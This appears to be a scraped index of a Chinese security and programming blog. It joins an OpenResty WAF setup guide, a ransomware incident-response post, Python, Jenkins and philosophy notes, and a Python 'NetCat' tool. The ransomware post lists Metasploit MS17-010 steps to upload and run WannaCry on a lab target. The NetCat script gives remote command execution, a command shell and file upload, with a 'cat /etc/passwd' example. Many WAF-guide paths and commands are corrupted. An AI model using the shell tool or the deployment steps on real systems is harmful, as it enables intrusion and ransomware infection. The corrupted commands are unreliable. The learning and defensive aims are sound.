安装（CentOS 7）1、更新软件 yum -y update 2、添加openresty仓库 12wget https://openresty.org/package/centos/openresty.repomv openresty.repo /etc/yum.repos.d/ 3、安装openresty yum -y install openresty 4、安装命令行工具resty yum install -y openresty-resty 5、发布新版本后，更新软件 12yum check-update #列出所有可更新的软件清单yum update &lt;package_name&gt; #更新指定的软件 6、启动naigx /usr/local/openresty/nginx/sbin/nginx 7、访问http:&#x2F;&#x2F;[ip]:80 8、切换root，修改配置 其他系统安装，参考官方文章： https://openresty.org/cn/installation.html 2.3 配置2.3.1 防火墙不能从别的IP访问，查看防火墙状态：systemctl status firewalld 关闭防火墙命令： 12systemctl stop firewa]ld #关闭防火墙systemctl disable firewa1ld #关闭开机自启动，可选 关闭防火墙后可以从其他IP访问 2.3.2 创建网页默认安装路径是/usr/1oca1/openresty，修改nginx配置文件，可以创建自己的网页 12345678vi /usr/local/openresty/nginx/conf/nginx.conf# 在server中添加如下location字段:location /hi &#123; default_type text/html; content_by_lua_block&#123; ngx.say(&quot;hello openrastry!&quot;); &#125;&#125; 测试配置文件并重启： 12/usr/1ocal/openresty/nginx/sbin/nginx -t #测试配置文件是否正确，显示success，说明配置文件修改成功/usr/ocal/openresty/nginx/sbin/nginx -s reload #重新加载配置文件 2.3.3 配置PHP1、安装php yum install -y php 2、修改配置文件usr&#x2F;local&#x2F;openresty&#x2F;nagix&#x2F;conf&#x2F;nginx.conf 12345678#去掉这部分的注释，并修改/script为$document_rootlocation ~\\.php$ &#123; root html; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT FILENAME $document_root$fastcgi_script_name; include fastcgi params;&#125; 3、找到php.ini centos中文件路径为：/etc/php.ini 找不到配置文件时，可以使用命令搜索文件：find/*-name php.ini 去掉cgi.fix_pathinfo=1前面的注释 4、开启php-cgi： php-cgi -b 127.0.0.1:9000 -c /etc/php.ini 5、重载nginx配置： /usr/local/openresty/nginx/sbin/nginx -s reload 之后再去目录下php文件可以执行解析。 3 WAF使用3.1 部署WAF1、克隆WAF代码：git clone https://github.com/unixhot/waf.git 2、将下载的waf文件夹复制到/usr/local/openresty/nginx/conf/ 1cp -r ./waf/waf /usr/local/openresty/nginx/conf/ 3、修改waf中的config.lua文件，配置日志文件、规则文件路径、跳转地址，并根据需要修改触发WAF的显示信息 123456789--log dirconfig_1og_dir =&quot;/var/1og/nginx&quot;--rule settingconfig_rule_dir =&quot;/usr/local/openresty/nginx/conf/waf/rule-config&quot;--if config_waf_output ,setting urlconfig_waf_redirect_url = &quot;https://www.baidu.com&quot; # 触发WAF时的显示信息&lt;body&gt;&lt;h1 align=&quot;center&quot;&gt; 欢迎白帽子进行授权安全测试&lt;/body&gt; 4、赋予日志文件权限：chmod -R 777 /var/log/nginx 5、开启WAF：打开/usr/local/openresty/nginx/conf/nginx.conf，在http&#123;&#125;中增加如下内容： 12345#WAF lua shared dict imit 50m; 1ua_package_path &quot;/usr/local/openresty/nginx/conf/waf/?.1ua&quot;; init_by_lua_file &quot;/usr/local/openresty/nginx/conf/waf/init.lua&quot;; access_by_1ua_file &quot;/usr/ocal/openresty/nginx/conf/waf/access.lua&quot;; 6、建立resty的软连接： 1ln -s /usr/1ocal/openresty/lualib/resty/ /usr/local/openresty/nginx/conf/waf/resty 7、检查配置文件并重载nginx服务： 12/usr/lcoal/openresty/nginx/sbin/nginx -t/usr/1coal/openresty/nginx/sbin/nginx -s reload WAF部署好了，现在访问木马文件会被拦截。 管理者查看日志目录：/var/log/nginx 扫描工具大面积403说明目标网站有WAF。 3.2 理解WAFWAF简单描述，就是解析HTTP请求(协议解析模块)，规则检测(规则模块)，做不同的防御动作(动作模块)，并将防御过程(日志模块)记录下来。所以本文中的WAF的实现由五个模块(配置模块、协议解析模块、规则模块、动作模块、错误处理模块)组成。 支持IP白名单和黑名单功能，直接将黑名单的IP访问拒绝。 支持URL白名单，将不需要过滤的URL进行定义。 支持User-Agent的过滤，匹配自定义规则中的条目，然后进行处理(返回403)。 支持CC攻击防护，单个URL指定时间的访问次数，超过设定值，直接返回403。 支持Cookie过滤，匹配自定义规则中的条目，然后进行处理(返回403)。 支持URL过滤，匹配自定义规则中的条目，如果用户请求的URL包含这些，返回403。 支持URL参数过滤，原理同上。 支持日志记录，将所有拒绝的操作，记录到日志中去。 日志记录为JSON格式，便于日志分析，例如使用ELK进行攻击日志收集、存储、搜索和展示。 3.3 配置过滤规则waf&#x2F;access.lua文件配置了检测顺序： 1234567891011121314function waf main( if white_ip_check() then elseif black ip_check() then elseif user_agent_attack_check()then elseif cc_attack_check() then elseif cookie attack_check()then elseif white url_check() then elseif url attack_check() then elseif url_args_attack_check()then --elseif post attack_check() then else return endend 过滤规则在waf&#x2F;relu-config&#x2F;下，可根据需求自行调整，每条规则需换行，或者用|分割。 3.3.1 IP白名单waf/rule-config/whiteip.rule添加IP地址，对于这些地址发起的请求，WAF不会拦截。 3.3.2 IP黑名单waf/rule-config/blackip.rule添加IP地址 3.3.3 user-agent配置WAF可以检测请求中user-agent字段，并拦截带有指定user-agent值的请求。 waf/rule-config/useragent.rule添加 3.3.4 其他过滤规则 args.rule里面的规则get参数进行过滤的 url.rule是只在get请求url过滤的规则 post.rule是只在post请求过滤的规则 cookie.rule是对cookie中数据的过滤规则 whiteurl.rule是这是url的白名单","tags":["Emergency Response","Blue"],"categories":["Emergency Response"]},{"title":"python官方文档学习记录-基础教程","path":"/2024/07/24/编程语言/python官方文档学习记录/","content":"1. 课前甜点 shell 脚本擅长的是移动文件和改变文本数据，而不适合编写 GUI 应用或游戏。 Python “可以扩展”：会开发 C 语言程序，就能快速上手为解释器增加新的内置函数或模块，不论是让核心程序以最高速度运行，还是把 Python 程序链接到只提供预编译程序的库（比如，硬件图形库）。只要下点功夫，就能把 Python 解释器和用 C 开发的应用链接在一起，用它来扩展和控制该应用。 2. 使用 Python 的解释器[这里和2.1.1传入参数暂时跳过，之后再看暂时不是特别重要] 有命令行参与：1. 命令行与环境 — Python 3.12.4 文档 如果不使用默认编码，则要声明文件的编码，文件的 第一 行（例外情况如下段shebang行）要写成特殊注释。句法如下：# -*- coding: encoding -*- 类Unix系统上，Python 脚本可以像 shell 脚本一样直接执行：#!/usr/bin/env python3 3. Python 速览主要就是数字、文本、列表。我速览，都是基础内容。 [ ] 左闭右开 -1代表最后一个字符 12345 +---+---+---+---+---+---+ | P | y | t | h | o | n | +---+---+---+---+---+---+ 0 1 2 3 4 5 6-6 -5 -4 -3 -2 -1 不可更改、不可切片赋值：字符串、元组 可以更改、切片赋值：列表（嵌套列表是多维数组） 4. 更多控制流工具","tags":["python"],"categories":["Programming Language","Python"]},{"title":"04 应急响应-勒索病毒","path":"/2024/07/23/红蓝攻防/04勒索病毒/","content":"勒索病毒是什么程序木马、网页挂马等形式进行传播，勒索病毒，是一种电脑病毒该丰要门病毒性质恶劣、危害极大，一旦感染将给用户带来无法估量的损失。这种病毒利用各种加密算法对文件进行加密，被感染者一般无法解密，必须拿到解密的私钥才有可能破解。 勒索病毒通常使用非对称和对称加密算法组合的形式来加密文件，绝大部分勒索病毒均无法通过技术手段解密，一般无法溯源，危害巨大。 常见勒索病毒——WannaCry2017年5月12日WannaCry蠕虫通过MS17-010漏洞在全球范围大爆发，感染了大量的计算机，该蠕虫感染计算机后会向计算机中植入勒索病毒，导致电脑大量文件被加密。受害者电脑被黑客锁定后，病毒会提示支付价值相当于300美元)(约合人民币2069元)的比特市才可解锁。 WannaCry(又叫Wanna Decryptor)，一种“蠕虫式”的勒索病毒软件，大小3.3MB，由不法分子利用NSA(National Security Agency，美国国家安全局)泄露的危险漏洞“EternalBlue”(永恒之蓝)进行传播。 WannaCry勒索病毒全球大爆发，至少150个国家、30万名用户中招，造成损失达80亿美元已经影响到金融，能源，医疗等众多行业，造成严重的危机管理问题。 特征常见后缀名：wncny 传播方式：“永恒之蓝”漏洞 特征：启动时会连接一个不存在的URL创建系统服务mssecsvc2.0，释放路径为windows目录 常见勒索病毒——GlobelmposterGlobelmposter 勒索病毒寸 2017年5月首次出现，主要通达方式传播 自2018年8月21日起，多地发生Globelmposter勒索病毒事件，此次攻击目标主要是开启远程桌面服务的服务器，攻击者通过暴力破解服务器密码，对内网服务器发起扫描并人工投放勒索病毒，导致文件被加密，暂时无法解密 特征常见后缀名：auchentoshan、动物名+4444等 传播方法：RDP 暴力破解、钓鱼邮件、捆绑软件 特征：释放在 %appdata%或%localappdata% 常见勒索病毒——Crysis&#x2F;DharmaCrysis&#x2F;Dharma 勒索病毒最早出现在 2016年，2017年5月在万能密钥被公布之后，消失了一段时间，但在 2017年6月开始继续更新。攻击方法同样是通过远程 RDP暴力破解的方式植入用户的服务器进行攻击。由于采用 AES+RSA 的加密方式，其最新版本无法解密。 特征常见后缀：id+勒索邮箱+特定后缀 传播方式：RDP 暴力破解 特征：勒索信位置在 startup 目录；样本位置在 %windir%System32、startup目录、%appdata% 目录 常见勒索病毒——GandCrabGandCrab勒索病毒于2018年1月面世以来，一年内经多次版本更新因前最新的版本为V5该病毒利用多种方式对企业网络进行攻击传播，受感染主机的数据库、图片、压缩包、文档等文件将被加密，若没有相应数据或文件的备份将会影响业务的正常运行。 病毒采用Salsa20和RSA-2048算法对文件进行加密，并修改文件后为.GDCB、.GRAB、.KRAB或5-10位随机字母，勒索信息文件为GDCB-DECRYPT.txt、KRAB-DECRYPT.txt、[5-10随机字母]-DECRYPT.htmItxt，并将感染主机桌面背景替换为勒索信息图片。 特征常见后缀：随机生成 传播方式：RDP暴力破解、钓鱼邮件、捆绑软件、僵尸网络、漏洞传播等 特征：样本执行完毕后自动删除，并会修改感染主机桌面背景，有后缀MANUALtxt、DECRYPT.txt 解密方式 解密方法 难度系数 入侵攻击者的服务器获取非对称加密的私钥，用非对称加密的私钥解密经过非对称加密公钥加密后的对称加密密钥，进而解密文件数据 高 勒索病毒加密算法设计存在问题，比如2018年“微信支付“勒索病毒高加密密钥存放在本地，所以很快就被破解 高 暴力破解 高 支付赎金下载特定的解密器 中 在kali模拟目标机：win7 1 启动msf msfconsole 2 搜索相关模块 search ms17-010 use 0 3 配置参数 options &#x2F;&#x2F;查看相关参数 set rhost 目标主机ip 4 开始攻击 run whoami 5 上传病毒 ls unzip ls -i &#x2F;&#x2F;发现文件id find -inum id -exec unzip &#123;&#125; \\; ls mv wcry.exe_ wcey.exe &#x2F;&#x2F;解压成功 help upload /root/test/wcry.exe pwd execute -f wcry.exe 6 查看病毒是否运行 ps -ef | grep wcry.exe 应急响应方案0 数据备份1 事件判断 什么漏洞、什么问题 2 临时处置 禁止使用U盘、移动硬盘 3 信息收集与分析 样本分析 文件排查、exe排查、网络排查netstat -ano 4 事件处置 通过PID查看程序执行目录：wmic process where processid=2984 get name,executablepath 查看可疑IP地址：87.236.194.23、159.68.207.20、176.31.163.89 微步在线：https://xthreabook.cn/ 5 事件抑制 1、隔离问题主机，断开网络连接，尽量关闭外部连接 2、将135，139，445端口关闭，封堵非业务端口 3、将服务器&#x2F;主机密码全部更改为复杂的高强度的密码 4、安装安全补丁，尤其是 MS17-010 漏洞的补丁 6 根除与恢复 1、终端安装企业级防病毒软件 2、使用流量监控设备进行内网流量监控 3、出口防火墙封堵可疑地址","tags":["Emergency Response","Blue"],"categories":["Emergency Response"]},{"title":"Jenkins and Auto Testing","path":"/2024/07/22/杂/Jenkins/","content":"Ⅰ 安装windowsWindows安装Jenkins教程（详细）_window 安装jenkins-CSDN博客 默认安装插件： 安装成功初始界面： 添加用户界面： LinuxⅡ 配置搭建参考手把手教你 jenkins+github执行python程序_jenkins 从github配置python项目-CSDN博客 Jenkins教程-3-github自动化测试任务构建_jenkins github-CSDN博客 Jenkins教程-6-自动化测试任务生成Allure报告_jenkins构建后生成allure报告-CSDN博客 Jenkins教程-7-自动化测试任务发送结果邮件_jenkins邮件发送测试报告 jenkins发送邮件-CSDN博客 实践在jenkins添加github令牌： 全局凭据配置： 构建失败考虑浅克隆（拉取最近一次提交）： 构建成功： Ⅲ 测试相关参考接口自动化测试框架实战-0-项目功能概览-CSDN博客 Ⅳ 集成SonarQube进行代码扫描Ⅴ 自动化测试集成——Jenkins+Maven+JMater","tags":["CI","testing","Jenkins"],"categories":["DevOps","CI/CD"]},{"title":"哲学的历程4th-阅读笔记","path":"/2024/07/21/阅读/哲学的历程4th阅读笔记/","content":"引论 简明哲学导览日常生活中随处可见的讨论和观念在哲学中都有相对应的概念。 理解题 在何种程度上我们以得感冒的方式获得我们的观念？这为什么是糟糕的？学习哲学史可以怎样对此做出补救？ 答：大环境或者社会赋予我们的观念通常被我们无意识接受。它们未被思考。人就会处于混沌中度过，同时也丧失了选择其他信念的可能性。学习哲学史可以获得关于自己信念一副更清晰的图景、理解它们的起源、可以看到此种信念的强项与弱点。最后，也可以换其他我不知晓的信念。 哲学为什么像一种关系？ 答：就像面对我们喜欢的人一样，乐此不疲地探索彼此个性的方方面面。成功的哲学家无休止地探索新观念和旧观念的新维度。 什么是“哲学”这个词项的字面意义？ 答：本书概念：“人类企图系统地研究我们整个经验的最基本结构，以便达到观念上尽可能清晰、经验上尽可能被确证和理性上尽可能融贯的信念。” 什么是评价哲学的三个标准？ 答：1概念清晰性；2经验确证性；3理性融贯性（不包含矛盾或不与自身相冲突） 关于一个论证要问的两个问题是什么？ 答：如下： 前提能被接受吗？ a. 它们清晰吗？ b. 它们有道理吗？ 前提给结论提供了足够支持吗？ 以下术语的意义是什么：演绎有效的、可靠论证、归纳强的论证、有说服力的论证？ 答：①有效论证（Valid argument）——成功的演绎论证，它的形式使得如果前提为真，则结论必然为真。②可靠论证（sound argument）——Ⅰ有效的 and Ⅱ所有前提为真的演绎论证。③归纳强的论证（inductively strong argument）——一种成功的归纳论证，如果其中的前提为真，将使结论的概然性很高。④有说服力的论证（cogent argument）——a归纳性强 and b所有奇纳提都为真的论证。 字母“FOCUS”象征的四个哲学阅读策略是什么？ 答：Facts(事实)、Outlook(观点)、Critique(批判)、Undergoing Self-examination(经历自我审查) 什么是哲学的三个主要领域？属于每个标题下的问题是什么？ 答：认识论（知识理论）、形而上学（实在理论）、伦理学 认识论：⚪什么是真理？⚪什么是知识？⚪理性告诉我们关于世界的信息吗？⚪什么是理性的限度？⚪感觉经验作为知识的来源有多可靠？⚪存在着独立于理智达到真理的方式吗(例如信仰或直觉)？ 形而上学(实在理论)：⚪什么是终极实在？⚪除了物理世界之外，还存在其他种类的实在吗？⚪存在多少不同种类的实在？⚪什么是心灵？⚪心灵如何与身体相联系？⚪我们是自由的还是被决定的？ 伦理学：⚪什么让一个行为是正确的或错误的？⚪存在任何客观的或绝对的道德原则吗？⚪道德判断基于知识、感情还是直觉？⚪道德依赖宗教吗？ 思考题 在现实生活中发现与本章开头七个场景类似的例子。在这些场景中，人们在讨论哲学问题，却没有真正认识到这一点。另外，什么使得某问题是一个“哲学问题”？ 陈述某些你相信的哲学主张。提供一个相信这个主张的实际很弱的论证。现在，给这个主张提供一个你认为好的论证。什么使得一个论证弱而另一个论证强？","tags":["read","philosophy"],"categories":["Read"]},{"title":"NetCat实现","path":"/2024/07/20/工具/netcat实现/","content":"123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166import argparseimport socketimport shlex# subprocess这个库提供了一组强大的进程创建接口，可以通过多种方式调用其他程序。import subprocessimport sysimport textwrapimport threading# 这个函数将会接受一条命令并执行，然后将结果作为一段字符串返回。def execute(cmd): cmd = cmd.strip() if not cmd: return # subprocess用到了它的check_output函数，这个函数会在本机运行一条命令，并返回该命令的输出。 output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT) return output.decode()class NetCat: # main代码块传进来的命令行参数和缓冲区数据，初始化一个NetCat对象 def __init__(self, args, buffer=None): self.args = args self.buffer = buffer # 然后创建一个socket对象 self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) def run(self): # 如果我们的NetCat对象是接收方，run就执行listen函数 if self.args.listen: self.listen() # 如果是发送方，run就执行send函数 else: self.send() def send(self): # 先连接到target和port self.socket.connect((self.args.target, self.args.port)) # 如果这时缓冲区里有数据的话，就先把这些数据发过去。 if self.buffer: self.socket.send(self.buffer) # 创建一个try/catch块，这样就能直接用Ctrl+C组合键手动关闭连接 try: # 创建一个大循环，一轮一轮地接收target返回的数据 while True: recv_len = 1 response = &#x27;&#x27; # 在大循环里，建了一个小循环，用来读取socket本轮返回的数据 while recv_len: data = self.socket.recv(4096) recv_len = len(data) response += data.decode() # 如果socket里的数据目前已经读到头，就退出小循环 if recv_len &lt; 4096: break if response: print(response) buffer = input(&#x27;&gt; &#x27;) buffer += &#x27; &#x27; # 检查刚才有没有实际读出什么东西来，如果读出了什么，就输出到屏幕上， # 并暂停，等待用户输入新的内容，再把新的内容发给target self.socket.send(buffer.encode()) # 接着开始下一轮大循环 # Ctrl+C组合键触发KeyboardInterrupt中断循环 except KeyboardInterrupt: print(&#x27;User terminated.&#x27;) self.socket.close() sys.exit() def listen(self): # listen函数把socket对象绑定到target和port上 self.socket.bind((self.args.target, self.args.port)) self.socket.listen(5) # 开始用一个循环监听新连接 while True: client_socket, _ = self.socket.accept() # 并把已连接的socket对象传递给handle函数 client_thread = threading.Thread( target=self.handle, args=(client_socket,) ) client_thread.start() def handle(self, client_socket): # 如果要执行命令，handle函数就会把该命令传递给execute函数，然后把输出结果通过socket发回去。 if self.args.execute: output = execute(self.args.execute) client_socket.send(output.encode()) # 如果要上传文件，我们就建一个循环来接收socket传来的文件内容 # 再将收到的全部数据写到参数指定的文件里。 elif self.args.upload: file_buffer = b&#x27;&#x27; while True: data = client_socket.recv(4096) if data: file_buffer += data else: break with open(self.args.upload, &#x27;wb&#x27;) as f: f.write(file_buffer) message = f&#x27;Saved file &#123;self.args.upload&#125;&#x27; client_socket.send(message.encode()) # 如果要创建一个shell，创建一个循环，向发送方发一个提示符，然后等待其发回命令。 # 每收到一条命令，就用execute函数执行它，然后把结果发回发送方。 elif self.args.command: cmd_buffer = b&#x27;&#x27; while True: try: client_socket.send(b&#x27;BHP: #&gt; &#x27;) # shell是收到换行符后才执行命令的 while &#x27; &#x27; not in cmd_buffer.decode(): cmd_buffer += client_socket.recv(64) response = execute(cmd_buffer.decode()) if response: client_socket.send(response.encode()) cmd_buffer = b&#x27;&#x27; except Exception as e: print(f&#x27;server killed &#123;e&#125;&#x27;) self.socket.close() sys.exit()if __name__ == &#x27;__main__&#x27;: # 标准库里的argparse库创建了一个带命令行界面的程序 # 传递不同的参数，就能控制这个程序执行不同的操作 # 比如上传文件、远程执行命令，或是打开一个命令行shell。 parser = argparse.ArgumentParser( description=&#x27;BHP Net Tool&#x27;, formatter_class=argparse.RawDescriptionHelpFormatter, # 编写了一段帮助信息，程序启动的时候如果发现--help参数，就会显示这段信息。 epilog=textwrap.dedent(&#x27;&#x27;&#x27;Example: netcat.py -t 192.168.152.128 -p 6666 -l -c # command shell netcat.py -t 192.168.152.128 -p 6666 -l -u=mytest.txt # upload to file netcat.py -t 192.168.152.128 -p 6666 -l -e=\\&quot;cat /etc/passwd\\&quot; # execute command echo &#x27;ABC&#x27; | ./netcat.py -t 192.168.152.128 -p 135 # echo text to server port 135 netcat.py -t 192.168.152.128 -p 6666 # connect to server &#x27;&#x27;&#x27;)) # 添加了6个参数，用来控制程序的行为 # 使用了-c、-e和-u这三个参数，就意味着要使用-l参数，因为这些行为都只能由接收方来完成。 # 程序收到-c参数，就会打开一个交互式的命令行shell； parser.add_argument(&#x27;-c&#x27;, &#x27;--command&#x27;, action=&#x27;store_true&#x27;, help=&#x27;command shell&#x27;) # 收到-e参数，就会执行一条命令； parser.add_argument(&#x27;-e&#x27;, &#x27;--execute&#x27;, help=&#x27;execute specified command&#x27;) # 收到-l参数，就会创建一个监听器； parser.add_argument(&#x27;-l&#x27;, &#x27;--listen&#x27;, action=&#x27;store_true&#x27;, help=&#x27;listen&#x27;) # -p参数用来指定要通信的端口； parser.add_argument(&#x27;-p&#x27;, &quot;--port&quot;, type=int, default=6666, help=&#x27;specified port&#x27;) # -t参数用来指定要通信的目标IP地址； parser.add_argument(&#x27;-t&#x27;, &#x27;--target&#x27;, default=&#x27;192.168.152.128&#x27;, help=&#x27;specified IP&#x27;) # -u参数用来指定要上传的文件。 parser.add_argument(&#x27;-u&#x27;, &#x27;--upload&#x27;, help=&#x27;upload file&#x27;) args = parser.parse_args() # 如果确定了程序要进行监听，我们就在缓冲区里填上空白数据，把空白缓冲区传给NetCat对象。 # 反之，我们就把stdin里的数据通过缓冲区传进去。最后调用NetCat类的run函数来启动它。 if args.listen: buffer = &#x27;&#x27; else: buffer = sys.stdin.read() nc = NetCat(args, buffer.encode()) nc.run() 内置类型 str.strip([chars])str.strip([chars]) 返回原字符串的副本，移除其中的前导和末尾字符。 chars 参数为指定要移除字符的字符串。 如果省略或为 None，则 chars 参数默认移除空白符。 实际上 chars 参数并非指定单个前缀或后缀；而是会移除参数值的所有组合: 1234&gt;&gt;&gt; &#x27; spacious &#x27;.strip()&#x27;spacious&#x27;&gt;&gt;&gt; &#x27;www.example.com&#x27;.strip(&#x27;cmowz.&#x27;)&#x27;example&#x27; 最外侧的前导和末尾 chars 参数值将从字符串中移除。 开头端的字符的移除将在遇到一个未包含于 chars 所指定字符集的字符时停止。 类似的操作也将在结尾端发生。 例如: 123&gt;&gt;&gt; comment_string = &#x27;#....... Section 3.2.1 Issue #32 .......&#x27;&gt;&gt;&gt; comment_string.strip(&#x27;.#! &#x27;)&#x27;Section 3.2.1 Issue #32&#x27; subprocess — 子进程管理subprocess 模块允许你生成新的进程，连接它们的输入、输出、错误管道，并且获取它们的返回码。此模块打算代替一些老旧的模块与功能： check_outputsubprocess.check_output(args, *, stdin=None, stderr=None, shell=False, cwd=None, encoding=None, errors=None, universal_newlines=None, timeout=None*, *text=None, **other_popen_kwargs) 附带参数运行命令并返回其输出。 如果返回码非零则会引发 CalledProcessError。 CalledProcessError 对象将在 returncode 属性中保存返回码并在 output 属性中保存所有输出。 这相当于： 1run(..., check=True, stdout=PIPE).stdout 上面显示的参数只是常见的一些。 完整的函数签名与 run() 的大致相同 —— 大部分参数会通过该接口直接传递。 存在一个与 run() 行为不同的 API 差异：传递 input=None 的行为将与 input=b&#39;&#39; (或 input=&#39;&#39;，具体取决于其他参数) 一样而不是使用父对象的标准输入文件处理。 默认情况下，此函数将把数据返回为已编码的字节串。 输出数据的实际编码格式将取决于发起调用的命令，因此解码为文本的操作往往需要在应用程序层级上进行处理。 此行为可以通过设置 text, encoding, errors 或将 universal_newlines 设为 True 来重载，具体描述见 常用参数 和 run()。 要在结果中同时捕获标准错误，请使用 stderr=subprocess.STDOUT: 12345&gt;&gt;&gt; subprocess.check_output(··· &quot;ls non_existent_file; exit 0&quot;,··· stderr=subprocess.STDOUT,··· shell=True)&#x27;ls: non_existent_file: No such file or directory &#x27; Added&nbsp;in&nbsp;version&nbsp;3.1. 在3.3版本发生变更:timeout 被添加 在3.4版本发生变更:增加了对 input 关键字参数的支持。 在3.6版本发生变更:增加了 encoding 和 errors。详情参见 run()。 Added&nbsp;in&nbsp;version&nbsp;3.7:text 作为 universal_newlines 的一个更具可读性的别名被添加。 在3.12版本发生变更:针对 shell=True 改变的 Windows shell 搜索顺序。 当前目录和 %PATH% 会被替换为 %COMSPEC% 和 %SystemRoot%\\System32\\cmd.exe。 因此，在当前目录中投放一个命名为 cmd.exe 的恶意程序不会再起作用。 shlex — 简单的词法分析shlex 类可用于编写类似 Unix shell 的简单词法分析程序。通常可用于编写“迷你语言”（如 Python 应用程序的运行控制文件）或解析带引号的字符串。 shlex 模块中定义了以下函数： shlex.split(s, comments&#x3D;False, posix&#x3D;True)用类似 shell 的语法拆分字符串 s。如果 comments 为 False (默认值)，则不会解析给定字符串中的注释 (commenters 属性的 shlex 实例设为空字符串)。 本函数默认工作于 POSIX 模式下，但若 posix 参数为 False，则采用非 POSIX 模式。 在 3.12 版本发生变更: 传入 None 作为 s 参数现在会引发异常，而不是读取 sys.stdin。 备注：将 shell 命令拆分为参数序列的方式可能并不很直观，特别是在复杂的情况下。 shlex.split() 可以演示如何确定 args 适当的拆分形式： 1234567&gt;&gt;&gt; import shlex, subprocess&gt;&gt;&gt; command_line = input()/bin/vikings -input eggs.txt -output &quot;spam spam.txt&quot; -cmd &quot;echo &#x27;$MONEY&#x27;&quot;&gt;&gt;&gt; args = shlex.split(command_line)&gt;&gt;&gt; print(args)[&#x27;/bin/vikings&#x27;, &#x27;-input&#x27;, &#x27;eggs.txt&#x27;, &#x27;-output&#x27;, &#x27;spam spam.txt&#x27;, &#x27;-cmd&#x27;, &quot;echo &#x27;$MONEY&#x27;&quot;]&gt;&gt;&gt; p = subprocess.Popen(args) # Success! 特别注意，由 shell 中的空格分隔的选项（例如 -input）和参数（例如 eggs.txt ）位于分开的列表元素中，而在需要时使用引号或反斜杠转义的参数在 shell （例如包含空格的文件名或上面显示的 echo 命令）是单独的列表元素。 argparse 教程argparse 教程 — Python 3.12.5 文档 这篇教程旨在作为 argparse 的入门介绍，此模块是 Python 标准库中推荐的命令行解析模块。 备注：还有另外两个模块可以完成同样的任务，即 [getopt](https://docs.python.org/zh-cn/3/library/getopt.html#module-getopt getopt: Portable parser for command line options; support both short and long option names.) (等价于 C 语言中的 getopt()) 和已被弃用的 [optparse](https://docs.python.org/zh-cn/3/library/optparse.html#module-optparse optparse: Command-line option parsing library.（已弃用）)。 还要注意 [argparse](https://docs.python.org/zh-cn/3/library/argparse.html#module-argparse argparse: Command-line option and argument parsing library.) 是基于 [optparse](https://docs.python.org/zh-cn/3/library/optparse.html#module-optparse optparse: Command-line option parsing library.（已弃用）) 的，因此用法与其非常相似。 socket — 低层级的网络接口socket — 低层级的网络接口 — Python 3.12.5 文档 这个模块提供了访问 BSD 套接字 的接口。在所有现代 Unix 系统、Windows、macOS 和其他一些平台上可用。 备注：一些行为可能因平台不同而异，因为调用的是操作系统的套接字API。 常量 socket.AF_UNIX socket.AF_INET socket.AF_INET6 这些常量表示地址（和协议）族，被用作传给 socket() 的第一个参数。 如果 AF_UNIX 常量未定义则该协议将不受支持。 根据具体系统可能会有更多的常量可用。 socket.SOCK_STREAM socket.SOCK_DGRAM socket.SOCK_RAW socket.SOCK_RDM socket.SOCK_SEQPACKET 这些常量表示套接字类型，被用作传给 socket() 的第二个参数。 根据具体系统可能会有更多的常量可用。 （只有 SOCK_STREAM 和 SOCK_DGRAM 是普遍适用的。） 套接字对象socket.setsockopt(level, optname, value: int) socket.setsockopt(level, optname, value: buffer) socket.setsockopt(level, optname, None, optlen: int) 设置给定套接字选项的值 (参见 Unix 手册页 setsockopt(2))。 所需的符号常量已定义在本模块中 (SO_* 等 )。 该值可以是整数、None 或表示缓冲区的 bytes-like object。 在后一种情况下将由调用者确保字节串中包含正确的数据位 (请参阅可选的内置模块 struct 了解如何将 C 结构体编码为字节串)。 当 value 设为 None 时，optlen 参数是必须的。 这等价于调用 setsockopt() C 函数并设置 optval=NULL 和 optlen=optlen。 SO_REUSEADDR Indicates that the rules used in validating addresses supplied in a bind(2) call should allow reuse of local addresses. For AF_INET sockets this means that a socket may bind, except when there is an active listening socket bound to the address. When the listening socket is bound to INADDR_ANY with a specific port then it is not possible to bind to this port for any local address. Argument is an integer boolean flag. SOL_SOCKETgetsockopt(2) — manpages-dev — Debian bookworm — Debian Manpages SYNOPSIS#include &lt;sys&#x2F;socket.h&gt; int getsockopt(int sockfd, int level, int optname, void optval[restrict .optlen],* *socklen_t restrict optlen);**int setsockopt(int sockfd, int level, int optname, const void optval[.optlen], socklen_t optlen); DESCRIPTIONgetsockopt() and setsockopt() manipulate options for the socket referred to by the file descriptor sockfd. Options may exist at multiple protocol levels; they are always present at the uppermost socket level. When manipulating socket options, the level at which the option resides and the name of the option must be specified. To manipulate options at the sockets API level, level is specified as SOL_SOCKET. To manipulate options at any other level the protocol number of the appropriate protocol controlling the option is supplied. For example, to indicate that an option is to be interpreted by the TCP protocol, level should be set to the protocol number of TCP; see getprotoent(3). The arguments optval and optlen are used to access option values for setsockopt(). For getsockopt() they identify a buffer in which the value for the requested option(s) are to be returned. For getsockopt(), optlen is a value-result argument, initially containing the size of the buffer pointed to by optval, and modified on return to indicate the actual size of the value returned. If no option value is to be supplied or returned, optval may be NULL. Optname and any specified options are passed uninterpreted to the appropriate protocol module for interpretation. The include file &lt;sys&#x2F;socket.h&gt; contains definitions for socket level options, described below. Options at other protocol levels vary in format and name; consult the appropriate entries in section 4 of the manual. Most socket-level options utilize an int argument for optval. For setsockopt(), the argument should be nonzero to enable a boolean option, or zero if the option is to be disabled. For a description of the available socket options see socket(7) and the appropriate protocol man pages. threading — 基于线程的并行这个模块定义了许多类，详见以下部分。 该模块的设计基于 Java的线程模型。 但是，在Java里面，锁和条件变量是每个对象的基础特性，而在Python里面，这些被独立成了单独的对象。 Python 的 Thread 类只是 Java 的 Thread 类的一个子集；目前还没有优先级，没有线程组，线程还不能被销毁、停止、暂停、恢复或中断。 Java 的 Thread 类的静态方法在实现时会映射为模块级函数。 线程对象Thread 类代表一个在独立控制线程中运行的活动。 指定活动有两种方式：向构造器传递一个可调用对象，或在子类中重载 run() 方法。 其他方法不应在子类中重载（除了构造器）。 换句话说，只能 重载这个类的 __init__() 和 run() 方法。 当线程对象一旦被创建，其活动必须通过调用线程的 start() 方法开始。 这会在独立的控制线程中发起调用 run() 方法。 一旦线程活动开始，该线程会被认为是 ‘存活的’ 。当它的 run() 